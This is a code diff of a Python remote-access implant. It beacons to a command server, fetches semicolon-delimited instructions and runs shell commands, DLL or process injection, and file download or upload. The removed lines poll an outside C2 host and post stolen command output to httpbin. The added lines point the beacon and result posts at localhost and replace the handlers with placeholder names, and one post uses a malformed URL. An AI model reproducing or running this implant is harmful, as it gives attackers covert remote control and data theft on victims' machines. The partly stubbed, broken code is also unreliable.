@@ -87,42 +87,38 @@ def dwnld(url, ext):
     open(f'C:\\Users\\Public\\test{ext}', 'wb').write(r.content)
 
 
+GUID = uuid.uuid4()
 headers = {
-    'User-Agent': 'Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion'
-    # Set our UA to firefox
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 ',
+    'APPSESSIONID':f'{GUID}'
 }
-
+# Send our HELLO/GUID
+requests.get(f'http://127.0.0.1:5000/', headers=headers)
+ 
 # Below is the cert requirements for mTLS when using requests
 # , cert=('client.crt', 'client.key'), verify='ca.crt'
+time.sleep(60)
 while 1:
-    a = requests.get('http://c2.culbertreport.com:8000', headers=headers)
+    a = requests.get(f'http://127.0.0.1:80/{GUID}.html', headers=headers)
     cmd = a.text
+    print('got command')
     print(cmd)
     op = cmd.split(';')[0]
     cm = cmd.split(';')[1]
     ex = cmd.split(';')[2]
+    enc = cmd.split(';')[3]
+
     if op == 'cmd':
-        returned = cmdexe(cm)
-        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
-        print(response.request.url)
-        print(response.request.body)
-        print(response.request.headers)
-    if op == 'inject':
-        returned = dll_inject(cm)
-        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
-        print(response.request.url)
-        print(response.request.body)
-        print(response.request.headers)
-    if op == 'proc':
-        returned = proc_inject(cm)
-        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
-        print(response.request.url)
-        print(response.request.body)
-        print(response.request.headers)
+        returned = bleh(cm)
+        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
+    if op == 'inject': # We can use mavinject from cmd prompt
+        returned = bleh(cm)
+        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
     if op == 'download':
-        dwnld(cm, ex)
+        blehhhh(cm, ex)
     if op == 'upload':
-        upload(cm, ex)
+        blehhh(cm, ex)
     else:
-        time.sleep(1)
+        print('nada')
     time.sleep(20)
+
